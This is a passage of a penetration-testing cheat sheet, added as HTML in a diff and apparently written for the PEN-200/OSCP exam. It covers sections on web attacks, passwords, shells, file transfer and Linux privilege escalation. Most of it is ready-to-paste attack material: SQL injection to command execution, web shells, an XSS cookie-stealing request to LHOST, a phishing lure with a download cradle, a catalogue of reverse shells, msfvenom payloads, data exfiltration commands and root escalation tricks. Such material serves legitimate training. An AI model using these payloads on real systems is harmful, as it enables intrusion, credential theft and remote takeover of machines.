+</code></pre>
+<p><strong>Pulling data with UNION (MySQL):</strong></p>
+<pre><code class="language-sql">' ORDER BY 1-- -                    -- increase until it errors → N columns
+' UNION SELECT 1,2,3,4-- -          -- find the column shown on screen
+' UNION SELECT 1,database(),user(),@@version-- -
+' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
+' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
+' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users-- -
+</code></pre>
+<p><strong>File read/write → RCE (MySQL, FILE privilege):</strong></p>
+<pre><code class="language-sql">' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4-- -
+' UNION SELECT 1,'&lt;?php system($_GET[&quot;c&quot;]); ?&gt;',3,4 INTO OUTFILE '/var/www/html/s.php'-- -
+</code></pre>
+<p><strong>MSSQL → command execution (stacked queries):</strong></p>
+<pre><code class="language-sql">'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
+'; EXEC xp_cmdshell 'powershell -c &quot;IEX(IWR http://<span class="ph">LHOST</span>/rev.ps1 -UseBasicParsing)&quot;';-- -
+</code></pre>
+<p><strong>PostgreSQL → command:</strong></p>
+<pre><code class="language-sql">'; CREATE TABLE c(o text); COPY c FROM PROGRAM 'bash -c &quot;bash -i &gt;&amp; /dev/tcp/<span class="ph">LHOST</span>/443 0&gt;&amp;1&quot;';-- -
+</code></pre>
+<p>With blind SQLi, extract the data character by character: <code>' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -</code>. Automating this with Burp Intruder (Community) or a short Python loop is allowed, because it is <strong>your own script</strong>.</p>
+<h2 id="en-lfi">4.5 Directory traversal / LFI / RFI</h2>
+<pre><code class="language-text">../../../../../../etc/passwd
+....//....//....//etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+C:\Windows\System32\drivers\etc\hosts      (Windows: try ..\..\..\ )
+php://filter/convert.base64-encode/resource=index.php    → read the source code
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&amp;c=id
+</code></pre>
+<p>Valuable files to read: <code>/home/*/.ssh/id_rsa</code>, <code>/var/www/html/config.php</code>, <code>wp-config.php</code>, <code>/etc/apache2/sites-enabled/000-default.conf</code>, <code>C:\inetpub\wwwroot\web.config</code>, <code>C:\xampp\apache\conf\httpd.conf</code>, <code>C:\Users\&lt;user&gt;\.ssh\id_rsa</code>.</p>
+<p><strong>Log poisoning (LFI → RCE):</strong></p>
+<pre><code class="language-bash">curl -s &quot;http://$IP/&quot; -A '&lt;?php system($_GET[&quot;c&quot;]); ?&gt;'
+curl &quot;http://$IP/index.php?page=/var/log/apache2/access.log&amp;c=id&quot;
+# Windows XAMPP: C:\xampp\apache\logs\access.log
+</code></pre>
+<p><strong>RFI</strong> (if <code>allow_url_include=On</code>): <code>?page=http://LHOST/shell.php&amp;c=id</code> (<code>python3 -m http.server 80</code> on Kali).</p>
+<h2 id="en-upload">4.6 File upload bypass</h2>
+<pre><code class="language-text">shell.php  shell.phtml  shell.php5  shell.phar  shell.pHp       (extension list)
+shell.php.jpg  shell.jpg.php                                    (double extension)
+Content-Type: image/jpeg    + GIF89a; at the start of the body  (MIME/magic)
+.htaccess  →  AddType application/x-httpd-php .xyz              (then upload shell.xyz)
+shell.aspx / shell.asp / web.config                             (IIS)
+</code></pre>
+<p>After the upload: where did the file go? (<code>/uploads/</code>, a URL in the response). If it does not work: is the file being renamed, can you write to another directory with path traversal (<code>../../shell.php</code>)? Writing an SSH key as <code>../../../../root/.ssh/authorized_keys</code> is a classic PEN-200 scenario.</p>
+<p>Minimal web shells:</p>
+<pre><code class="language-php">&lt;?php system($_GET['c']); ?&gt;
+</code></pre>
+<pre><code class="language-aspx">&lt;%@ Page Language=&quot;C#&quot; %&gt;&lt;% System.Diagnostics.Process.Start(&quot;cmd.exe&quot;,&quot;/c &quot; + Request[&quot;c&quot;]); %&gt;
+</code></pre>
+<p>Ready-made on Kali: <code>/usr/share/webshells/</code> (php, asp, aspx, jsp) and <code>/usr/share/laudanum/</code>.</p>
+<h2 id="en-cmdi">4.7 Command injection</h2>
+<pre><code class="language-text">; id    | id    || id    &amp; id    &amp;&amp; id    $(id)    `id`    %0aid
+</code></pre>
+<p>If it is blind: <code>; sleep 5</code>, or <code>; curl http://LHOST/$(whoami)</code> (watch the http.server log on Kali), or <code>; ping -c 2 LHOST</code> (<code>sudo tcpdump -i tun0 icmp</code>).</p>
+<p>On Windows, find out whether the command runs in cmd or PowerShell:</p>
+<pre><code class="language-text">(dir 2&gt;&amp;1 *`|echo CMD);&amp;&lt;# rem #&gt;echo PowerShell
+</code></pre>
+<p>Filter bypass: <code>${IFS}</code> instead of a space; <code>w'h'o'a'm'i</code> for a blocked word; if everything is blocked, <code>echo &lt;base64&gt; | base64 -d | bash</code>.</p>
+<h2 id="en-ssti">4.8 SSTI</h2>
+<pre><code class="language-text">${{&lt;%[%'&quot;}}%\.          ← if this errors, there is a template engine
+{{7*7}}  → 49  : Jinja2 / Twig      {{7*'7'}} → 7777777 Jinja2,  49 Twig
+${7*7}   → 49  : Freemarker / Velocity
+&lt;%= 7*7 %&gt; → 49 : ERB (Ruby)
+</code></pre>
+<pre><code class="language-text">Jinja2:  {{ lipsum.__globals__[&quot;os&quot;].popen(&quot;id&quot;).read() }}
+Twig:    {{['id']|filter('system')}}
+Freemarker: &lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;${ex(&quot;id&quot;)}
+</code></pre>
+<h2 id="en-xss-xxe-ssrf">4.9 XSS, XXE, SSRF (short)</h2>
+<ul>
+<li><strong>XSS</strong> (a PEN-200 topic): a payload in a field the admin views (User-Agent, comment, contact form) → the admin's cookie (if it is not <code>HttpOnly</code>) or a request on the admin's behalf (for example JS that creates a new admin user in WordPress).
+  <code>&lt;script&gt;fetch('http://LHOST/?c='+document.cookie)&lt;/script&gt;</code></li>
+<li><strong>XXE:</strong> <code>&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;</code> — try it on every endpoint that accepts XML, and on SVG/DOCX uploads.</li>
+<li><strong>SSRF:</strong> scan internal services with <code>http://127.0.0.1:&lt;port&gt;/</code>; on Windows, use your own SMB server with <code>\\LHOST\x</code> / <code>http://LHOST</code> to capture the service account's NetNTLMv2 (<code>impacket-smbserver</code>, or <code>responder -A</code> which does no poisoning).</li>
+</ul>
+<h2 id="en-known-apps">4.10 Known applications and classic CVEs</h2>
+<pre><code class="language-bash"># WordPress
+wpscan --url http://$IP -e vp,vt,u --plugins-detection aggressive
+#   once admin: Appearance → Theme File Editor → 404.php  or  upload a plugin zip containing a shell
+# Tomcat Manager → WAR
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f war -o rev.war
+curl -u 'tomcat:s3cret' -T rev.war &quot;http://$IP:8080/manager/text/deploy?path=/rev&quot;
+curl http://$IP:8080/rev/
+# Jenkins Script Console (/script)
+#   println &quot;id&quot;.execute().text
+# Drupal / Joomla
+droopescan scan drupal -u http://$IP ;  joomscan -u http://$IP
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Software</th>
+<th>Version</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Apache httpd</td>
+<td>2.4.49 / 2.4.50</td>
+<td>CVE-2021-41773 / 42013 path traversal → RCE (if CGI is enabled)</td>
+</tr>
+<tr>
+<td>Samba</td>
+<td>3.0.20–3.0.25rc3</td>
+<td><code>usermap_script</code> CVE-2007-2447</td>
+</tr>
+<tr>
+<td>Samba</td>
+<td>3.5.0–4.6.4</td>
+<td>SambaCry CVE-2017-7494 (writable share)</td>
+</tr>
+<tr>
+<td>vsftpd</td>
+<td>2.3.4</td>
+<td>backdoor</td>
+</tr>
+<tr>
+<td>Drupal</td>
+<td>7.x / 8.x</td>
+<td>Drupalgeddon2 CVE-2018-7600</td>
+</tr>
+<tr>
+<td>Webmin</td>
+<td>1.890–1.920</td>
+<td>CVE-2019-15107</td>
+</tr>
+<tr>
+<td>Windows SMBv1</td>
+<td>unpatched 2008/7</td>
+<td>MS17-010 (EternalBlue)</td>
+</tr>
+<tr>
+<td>Grafana</td>
+<td>8.0.0–8.3.0</td>
+<td>CVE-2021-43798 path traversal</td>
+</tr>
+<tr>
+<td>Elasticsearch</td>
+<td>1.4.x</td>
+<td>CVE-2015-1427</td>
+</tr>
+</tbody>
+</table>
+<h2 id="en-exploits">4.11 Finding and adapting exploits</h2>
+<pre><code class="language-bash">searchsploit &quot;&lt;product&gt; &lt;version&gt;&quot;
+searchsploit -m &lt;EDB-ID&gt;          # copy
+searchsploit -x &lt;EDB-ID&gt;          # read
+# On GitHub: &quot;&lt;CVE&gt; poc&quot; — but READ the code first
+</code></pre>
+<p>Always before running one: <strong>(1)</strong> read the code — what does it do, where are LHOST/LPORT/URL/path? <strong>(2)</strong> Python 2 or 3? <strong>(3)</strong> Does it match the target version? <strong>(4)</strong> Do the default user/password/path need changing? If it errors, read the error message: most of the time it is a missing module, a wrong path or HTTPS vs HTTP. <strong>Note every line you change, for the report.</strong></p>
+<pre><code class="language-bash"># Compiling a Windows exploit on Kali
+x86_64-w64-mingw32-gcc exploit.c -o exploit.exe          # 64-bit
+i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32   # 32-bit + winsock
+</code></pre>
+<h2 id="en-client-side">4.12 Client-side attacks (e-mail / phishing scenario)</h2>
+<p>If the target environment has SMTP and there is a hint that "a user reads e-mail":</p>
+<pre><code class="language-bash"># 1) WebDAV server
+pip3 install wsgidav
+mkdir ~/webdav &amp;&amp; wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/
+</code></pre>
+<p>A <code>config.Library-ms</code> file (when the user opens it, Explorer shows your WebDAV share):</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;libraryDescription xmlns=&quot;http://schemas.microsoft.com/windows/2009/library&quot;&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;&lt;url&gt;http://<span class="ph">LHOST</span>&lt;/url&gt;&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;
+</code></pre>
+<p>Put a <strong>.lnk</strong> in the WebDAV folder (created on a Windows machine; as the target):
+<code>powershell.exe -c "IEX(New-Object Net.WebClient).DownloadString('http://LHOST:8000/powercat.ps1'); powercat -c LHOST -p 443 -e powershell"</code></p>
+<pre><code class="language-bash"># 2) Send it by e-mail
+swaks -t user@$DOMAIN --from it@$DOMAIN --server $IP --auth LOGIN --auth-user $USER --auth-password $PASS \
+      --header &quot;Subject: Config&quot; --body &quot;Please open the attached file.&quot; --attach @config.Library-ms
+</code></pre>
+<p>In an Office macro scenario: <code>AutoOpen</code>/<code>Document_Open</code> → PowerShell download cradle inside a <code>.doc</code> (the old macro-enabled format).</p>
+<hr />
+<h1 id="en-passwords">5. Passwords and hashes</h1>
+<h2 id="en-brute">5.1 Brute force and spraying</h2>
+<pre><code class="language-bash">hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
+hydra -L users.txt -P pass.txt ftp://$IP
+hydra -l admin -P rockyou.txt $IP http-post-form &quot;/login.php:user=^USER^&amp;pass=^PASS^:F=Invalid&quot;
+hydra -l admin -P rockyou.txt $IP http-get /admin/          # Basic auth
+hydra -l administrator -P pass.txt rdp://$IP -t 1
+
+# Domain spraying: check the policy first!
+nxc smb $DC -u $USER -p $PASS --pass-pol
+nxc smb $DC -u users.txt -p 'Winter2026!' --continue-on-success
+kerbrute passwordspray -d $DOMAIN --dc $DC users.txt 'Winter2026!'
+</code></pre>
+<p>Rule: if there is a lockout threshold, make threshold−1 attempts per user, then wait for the observation window. Brute force is the last resort; first <strong>build passwords from context</strong>:</p>
+<pre><code class="language-bash">cewl http://$IP -d 2 -m 5 -w cewl.txt                       # wordlist from the site
+hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule &gt; mutated.txt
+# Your own rule:  c $1 $! → capitalise the first letter + &quot;1!&quot;   (echo 'c $1 $!' &gt; my.rule)
+</code></pre>
+<h2 id="en-hash-types">5.2 Hash types</h2>
+<table>
+<thead>
+<tr>
+<th>Hash</th>
+<th>Looks like</th>
+<th>hashcat <code>-m</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>NTLM</td>
+<td><code>31d6cfe0d16ae931b73c59d7e0c089c0</code></td>
+<td>1000</td>
+</tr>
+<tr>
+<td>NetNTLMv2</td>
+<td><code>user::DOMAIN:1122..:...</code></td>
+<td>5600</td>
+</tr>
+<tr>
+<td>Kerberoast (RC4)</td>
+<td><code>$krb5tgs$23$*...</code></td>
+<td>13100</td>
+</tr>
+<tr>
+<td>AS-REP</td>
+<td><code>$krb5asrep$23$...</code></td>
+<td>18200</td>
+</tr>
+<tr>
+<td>MD5 / SHA1 / SHA256</td>
+<td>32 / 40 / 64 hex</td>
+<td>0 / 100 / 1400</td>
+</tr>
+<tr>
+<td>md5crypt / sha512crypt</td>
+<td><code>$1$</code> / <code>$6$</code></td>
+<td>500 / 1800</td>
+</tr>
+<tr>
+<td>bcrypt</td>
+<td><code>$2y$10$...</code></td>
+<td>3200</td>
+</tr>
+<tr>
+<td>KeePass</td>
+<td><code>$keepass$*2*...</code></td>
+<td>13400</td>
+</tr>
+<tr>
+<td>Net-NTLMv1</td>
+<td><code>user::DOMAIN:...</code></td>
+<td>5500</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-bash">hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 13100 kerb.txt rockyou.txt --show
+hashcat hash.txt --identify            # type detection (hashid works too)
+john --wordlist=rockyou.txt hash.txt ; john --show hash.txt
+</code></pre>
+<p>Try <strong>Pass-the-Hash</strong> first (seconds), then crack (minutes to hours).</p>
+<h2 id="en-2john">5.3 File passwords (*2john)</h2>
+<pre><code class="language-bash">ssh2john id_rsa &gt; h.txt               # passphrase-protected SSH key
+keepass2john Database.kdbx &gt; h.txt    # KeePass (for hashcat remove the leading &quot;Database:&quot;, -m 13400)
+zip2john backup.zip &gt; h.txt
+office2john doc.docx &gt; h.txt
+pdf2john file.pdf &gt; h.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt h.txt
+# Open the KeePass database
+keepassxc-cli ls Database.kdbx ; keepassxc-cli show -s Database.kdbx &quot;Entry Name&quot;
+</code></pre>
+<hr />
+<h1 id="en-shells">6. Shells</h1>
+<h2 id="en-revshells">6.1 Reverse shell catalogue</h2>
+<p>Replace <code>LHOST</code> and <code>443</code> when you paste on the target. On Kali: <code>rlwrap -cAr nc -lvnp 443</code>.</p>
+<pre><code class="language-bash">bash -c 'bash -i &gt;&amp; /dev/tcp/<span class="ph">LHOST</span>/443 0&gt;&amp;1'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc <span class="ph">LHOST</span> 443 &gt;/tmp/f
+nc -e /bin/bash <span class="ph">LHOST</span> 443
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((&quot;<span class="ph">LHOST</span>&quot;,443));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;])'
+php -r '$s=fsockopen(&quot;<span class="ph">LHOST</span>&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+perl -e 'use Socket;$i=&quot;<span class="ph">LHOST</span>&quot;;$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+<p><strong>From inside a web parameter</strong> (when special characters cause trouble), base64 it:</p>
+<pre><code class="language-bash"># Generate on Kali
+echo -n 'bash -i &gt;&amp; /dev/tcp/<span class="ph">LHOST</span>/443 0&gt;&amp;1' | base64 -w0
+# Run on the target
+echo &lt;B64&gt; | base64 -d | bash
+</code></pre>
+<p><strong>Windows / PowerShell — the most reliable way: generate on Kali, run as base64 UTF-16LE:</strong></p>
+<pre><code class="language-bash"># On Kali: (<span class="ph">LHOST</span> comes from the variable)
+cat &gt; rev.ps1 &lt;&lt;EOF
+\$c=New-Object Net.Sockets.TCPClient('$LHOST',443);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2&gt;&amp;1|Out-String);\$r2=\$r+'PS '+(pwd).Path+'&gt; ';\$sb=([Text.Encoding]::ASCII).GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length);\$s.Flush()};\$c.Close()
+EOF
+echo &quot;powershell -nop -w hidden -e $(iconv -t UTF-16LE rev.ps1 | base64 -w0)&quot;
+# Run the resulting single line on the target (cmd, web RCE, xp_cmdshell...).
+</code></pre>
+<p>Alternatives: <code>nc64.exe -e cmd.exe LHOST 443</code> (after uploading it to the target), powercat:</p>
+<pre><code class="language-powershell">IEX(New-Object Net.WebClient).DownloadString('http://<span class="ph">LHOST</span>/powercat.ps1');powercat -c <span class="ph">LHOST</span> -p 443 -e powershell
+</code></pre>
+<h2 id="en-msfvenom">6.2 msfvenom (allowed on every machine — except Meterpreter)</h2>
+<pre><code class="language-bash">msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o rev.exe
+msfvenom -p windows/shell_reverse_tcp     LHOST=$LHOST LPORT=443 -f exe -o rev32.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f dll -o rev.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f msi -o rev.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f aspx -o rev.aspx
+msfvenom -p linux/x64/shell_reverse_tcp   LHOST=$LHOST LPORT=443 -f elf -o rev.elf
+msfvenom -p java/jsp_shell_reverse_tcp    LHOST=$LHOST LPORT=443 -f war -o rev.war
+msfvenom -p php/reverse_php               LHOST=$LHOST LPORT=443 -f raw -o rev.php
+</code></pre>
+<div class="admonition warning">
+<p class="admonition-title">Staged ↔ stageless</p>
+<p><code>windows/x64/shell_reverse_tcp</code> (underscore) is <strong>stageless</strong> and can be caught with <code>nc</code>. <code>windows/x64/shell/reverse_tcp</code> (slash) is <strong>staged</strong> and can only be caught with <code>multi/handler</code>. Meterpreter payloads fall under the Metasploit restriction.</p>
+</div>
+<h2 id="en-tty">6.3 Linux TTY upgrade</h2>
+<pre><code class="language-bash">python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'     # if missing: script -qc /bin/bash /dev/null
+# Ctrl+Z
+stty raw -echo; fg
+# Enter
+export TERM=xterm-256color SHELL=/bin/bash
+stty rows 50 cols 200        # get your own values with 'stty size' on Kali
+</code></pre>
+<p>More robust: a full TTY with <code>socat</code>, if it is on the target or you can upload it:</p>
+<pre><code class="language-bash">socat file:`tty`,raw,echo=0 tcp-listen:4444                           # Kali
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<span class="ph">LHOST</span>:4444    # target
+</code></pre>
+<p><strong>If you have SSH access, drop everything and use SSH.</strong> Dropping an <code>authorized_keys</code> into a home directory you can write to gives the most stable shell.</p>
+<h2 id="en-win-shell">6.4 Better shells on Windows</h2>
+<ul>
+<li>If WinRM is open and you have credentials: <code>evil-winrm</code> (built-in upload/download).</li>
+<li>RDP: <code>xfreerdp3 /v:$IP /u:$USER /p:$PASS /cert:ignore /dynamic-resolution +clipboard /drive:share,/home/kali/exam/tools</code></li>
+<li>ConPtyShell (fully interactive):</li>
+</ul>
+<pre><code class="language-bash"># Kali
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+</code></pre>
+<pre><code class="language-powershell"># Target
+IEX(IWR http://<span class="ph">LHOST</span>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <span class="ph">LHOST</span> 3001
+</code></pre>
+<ul>
+<li>You have another user's password but no interactive session: <strong>RunasCs</strong></li>
+</ul>
+<pre><code class="language-powershell">.\RunasCs.exe svc_user 'Passw0rd!' cmd.exe -r <span class="ph">LHOST</span>:443
+</code></pre>
+<h2 id="en-no-shell">6.5 When the reverse shell does not arrive</h2>
+<ol>
+<li>Is <code>LHOST</code> really your tun0 IP? (<code>ip a show tun0</code>)</li>
+<li>Is the listener on the right port? <code>ss -tlnp | grep 443</code></li>
+<li>Outbound traffic from the target may be filtered: try <strong>80, 443, 53</strong>, or a port that is already open on the target.</li>
+<li>Test a simple connection first: <code>curl http://LHOST/test</code> / <code>ping LHOST</code> (watch with tcpdump).</li>
+<li>Architecture: an x64 payload does not run in a 32-bit process/OS.</li>
+<li>Special characters (<code>&amp;</code>, <code>|</code>, <code>'</code>) break inside the URL/command → URL-encode or base64.</li>
+<li>If Defender deletes the file: in-memory PowerShell, powercat instead of <code>nc64.exe</code>; a different payload format.</li>
+</ol>
+<hr />
+<h1 id="en-transfer">7. File transfer</h1>
+<h2 id="en-kali-servers">7.1 Servers on Kali (always running in tmux window 0)</h2>
+<pre><code class="language-bash">cd ~/exam/tools &amp;&amp; python3 -m http.server 80                     # downloads
+python3 -m uploadserver 8000                                       # uploads (pip install uploadserver)
+impacket-smbserver share . -smb2support -user k -password k        # SMB (newer Windows refuses guest access → use a username/password)
+</code></pre>
+<h2 id="en-kali-to-target">7.2 Kali → target</h2>
+<pre><code class="language-bash"># Linux target
+wget http://<span class="ph">LHOST</span>/linpeas.sh -O /tmp/lp.sh
+curl http://<span class="ph">LHOST</span>/linpeas.sh -o /tmp/lp.sh
+curl http://<span class="ph">LHOST</span>/linpeas.sh | bash                 # without writing to disk
+# no wget/curl
+exec 3&lt;&gt;/dev/tcp/<span class="ph">LHOST</span>/80; echo -e &quot;GET /pspy64 HTTP/1.0\r\n\r\n&quot; &gt;&amp;3; cat &lt;&amp;3 &gt; /tmp/p   # (strip the HTTP header afterwards)
+</code></pre>
+<pre><code class="language-powershell"># Windows target
+iwr http://<span class="ph">LHOST</span>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
+certutil -urlcache -split -f http://<span class="ph">LHOST</span>/nc64.exe C:\Windows\Temp\nc.exe
+curl.exe http://<span class="ph">LHOST</span>/nc64.exe -o C:\Windows\Temp\nc.exe
+IEX(New-Object Net.WebClient).DownloadString('http://<span class="ph">LHOST</span>/PowerUp.ps1')        # in memory
+net use \\<span class="ph">LHOST</span>\share /user:k k ; copy \\<span class="ph">LHOST</span>\share\nc64.exe C:\Windows\Temp\
+</code></pre>
+<p>Inside evil-winrm: <code>upload /home/kali/exam/tools/winPEASx64.exe</code> / <code>download C:\path\file</code>.</p>
+<h2 id="en-target-to-kali">7.3 Target → Kali</h2>
+<pre><code class="language-bash"># Linux
+curl -F 'files=@/tmp/loot.tgz' http://<span class="ph">LHOST</span>:8000/upload
+nc -lvnp 9001 &gt; loot.tgz            # Kali
+nc <span class="ph">LHOST</span> 9001 &lt; /tmp/loot.tgz       # target
+</code></pre>
+<pre><code class="language-powershell"># Windows
+copy C:\Windows\Temp\sam.hiv \\<span class="ph">LHOST</span>\share\
+(New-Object Net.WebClient).UploadFile('http://<span class="ph">LHOST</span>:8000/upload','C:\Windows\Temp\loot.zip')
+[Convert]::ToBase64String([IO.File]::ReadAllBytes(&quot;C:\Windows\Temp\small.txt&quot;))   # small file: copy and paste
+</code></pre>
+<p>Check integrity: <code>md5sum</code> (Linux) ↔ <code>Get-FileHash -Algorithm MD5</code> (Windows).</p>
+<table>
+<thead>
+<tr>
+<th>Error</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>certutil</code> / write "Access denied"</td>
+<td>Use <code>C:\Windows\Temp</code>, <code>C:\Users\Public</code> or <code>$env:TEMP</code></td>
+</tr>
+<tr>
+<td>Downloaded file is 0 bytes / HTML</td>
+<td>http.server is running in the wrong directory; try the URL in a browser</td>
+</tr>
+<tr>
+<td>SMB "guest access blocked"</td>
+<td><code>impacket-smbserver ... -user k -password k</code> + <code>net use</code></td>
+</tr>
+<tr>
+<td><code>Permission denied</code> when running on Linux</td>
+<td><code>chmod +x</code>; if <code>/tmp</code> is <code>noexec</code>, use <code>/dev/shm</code> or the home directory</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h1 id="en-linux-privesc">8. Linux privilege escalation</h1>
+<h2 id="en-linux-checklist">8.1 Ordered checklist (5 min manual first, then linpeas)</h2>
+<pre><code class="language-bash">id; sudo -l                                   # 1) sudo — the most common path
+find / -perm -4000 -type f 2&gt;/dev/null        # 2) SUID
+getcap -r / 2&gt;/dev/null                       # 3) capabilities
+cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers   # 4) cron
+ls -la /home/* /opt /var/www /srv; cat ~/.bash_history        # 5) passwords / interesting files
+ss -tlnp                                      # 6) services listening only on localhost (port forward!)
+ps aux | grep -i root                         # 7) custom processes running as root
+uname -a; cat /etc/os-release; sudo -V | head -1   # 8) kernel/sudo/polkit version
+cat /etc/exports 2&gt;/dev/null                  # 9) NFS no_root_squash
+</code></pre>
+<pre><code class="language-bash">curl http://<span class="ph">LHOST</span>/linpeas.sh | bash | tee /tmp/lp.txt   # red/yellow: 95% privesc
+./pspy64                                                 # watch for 2–3 min: root's periodic commands
+</code></pre>
+<p>If you see a <strong>service listening on localhost</strong> (e.g. 127.0.0.1:8080): expose it to Kali with <code>ssh -L 8080:127.0.0.1:8080 user@$IP</code> or chisel/ligolo — it is often a web application running as root.</p>
+<h2 id="en-sudo">8.2 sudo</h2>
+<p>Look up every binary in the <code>sudo -l</code> output on <strong>GTFOBins</strong> (<code>gtfobins.github.io</code> → "Sudo"). The most common ones:</p>
+<pre><code class="language-bash">sudo vim -c ':!/bin/bash'
+sudo find . -exec /bin/bash \; -quit
+sudo awk 'BEGIN {system(&quot;/bin/bash&quot;)}'
+sudo less /etc/hosts      # inside:  !/bin/bash
+sudo python3 -c 'import os; os.system(&quot;/bin/bash&quot;)'
+sudo env /bin/bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+sudo git -p help config   # inside:  !/bin/bash
+sudo zip /tmp/x.zip /etc/hosts -T -TT 'bash #'
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>In the <code>sudo -l</code> output</th>
+<th>Path</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>(ALL) NOPASSWD: /path/script.sh</code> and the script is writable</td>
+<td>Add <code>bash -p</code> to it</td>
+</tr>
+<tr>
+<td>The script itself is not writable but calls a command without a full path</td>
+<td>PATH hijack if there is no <code>secure_path</code></td>
+</tr>
+<tr>
+<td>A <code>*</code> wildcard inside the script</td>
+<td>wildcard injection (tar/rsync/chown)</td>
+</tr>
+<tr>
+<td><code>env_keep+=LD_PRELOAD</code></td>
+<td>LD_PRELOAD below</td>
+</tr>
+<tr>
+<td><code>(ALL, !root)</code> and sudo &lt; 1.8.28</td>
+<td><code>sudo -u#-1 /bin/bash</code> (CVE-2019-14287)</td>
+</tr>
+<tr>
+<td>You know your own password and have <code>(ALL : ALL) ALL</code></td>
+<td><code>sudo -i</code> 😊</td>
+</tr>
+</tbody>
+</table>
+<p><strong>LD_PRELOAD:</strong></p>
+<pre><code class="language-c">// /tmp/x.c
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+void _init() { unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash -p&quot;); }
+</code></pre>
+<pre><code class="language-bash">gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
+sudo LD_PRELOAD=/tmp/x.so &lt;any command allowed with sudo&gt;
+</code></pre>
+<h2 id="en-suid">8.3 SUID and capabilities</h2>
+<p>Use the <strong>"SUID"</strong> section on GTFOBins (it differs from the sudo command: you usually need <code>-p</code>).</p>
+<pre><code class="language-bash">/usr/bin/bash -p                                     # SUID bash
+find . -exec /bin/sh -p \; -quit                     # SUID find
+python3 -c 'import os; os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;,&quot;-p&quot;)'  # SUID python
+env /bin/sh -p                                       # SUID env
+# SUID cp / writable /etc/passwd: add a user with root privileges
+openssl passwd -1 -salt x Passw0rd                   # output: $1$x$...
+cp /etc/passwd /tmp/p; echo 'r00t:&lt;HASH&gt;:0:0:root:/root:/bin/bash' &gt;&gt; /tmp/p
